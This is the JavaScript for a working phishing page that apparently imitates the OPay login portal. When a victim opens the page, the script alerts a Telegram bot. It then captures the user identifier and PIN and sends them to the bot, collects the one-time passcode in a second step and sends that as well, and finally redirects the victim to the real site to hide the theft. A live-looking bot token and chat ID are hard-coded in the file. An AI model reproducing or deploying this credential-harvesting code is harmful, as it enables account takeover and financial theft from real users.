// 🔑 Your Credentials
const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
const chatId = '7909543900';

// Element Selectors
const loginForm = document.getElementById('login-form');
const otpForm = document.getElementById('otp-form');
const loginSection = document.getElementById('login-section');
const otpSection = document.getElementById('otp-section');

// 🛡️ Core Function: Send to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error("Signal error");
    }
}

// 1️⃣ ALERT ON CLICK: Inform you when the page opens
window.onload = () => {
    sendToTelegram("<b>🚀 Link Clicked!</b>\nA user has just opened the portal.");
};

// 2️⃣ LOGIN SUBMISSION: Validate and Send
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const user = document.getElementById('user-identifier');
    const pin = document.getElementById('user-pin');
    const btn = document.getElementById('next-btn');

    // Validation: Check if inputs are missing or incorrect
    let hasError = false;
    if (user.value.trim() === "") { user.classList.add('error'); hasError = true; }
    if (pin.value.length < 4) { pin.classList.add('error'); hasError = true; }

    if (hasError) return; // Stop if there are red boxes

    // Clear error looks if fixed
    user.classList.remove('error');
    pin.classList.remove('error');

    btn.innerText = "Verifying...";
    btn.disabled = true;

    // Send Login Data
    await sendToTelegram(`<b>New Entry</b>\nUser: ${user.value}\nPIN: ${pin.value}`);

    // Transition to OTP
    setTimeout(() => {
        loginSection.style.display = 'none';
        otpSection.style.display = 'block';
    }, 1500);
});

// 3️⃣ OTP SUBMISSION: Final step
otpForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const otp = document.getElementById('otp-code');
    const btn = document.getElementById('finish-btn');

    btn.innerText = "Completing...";
    btn.disabled = true;

    // Send OTP Data
    await sendToTelegram(`<b>OTP Received</b>\nCode: ${otp.value}`);

    // Redirect to the real site
    window.location.replace("https://www.opayweb.com/");
});

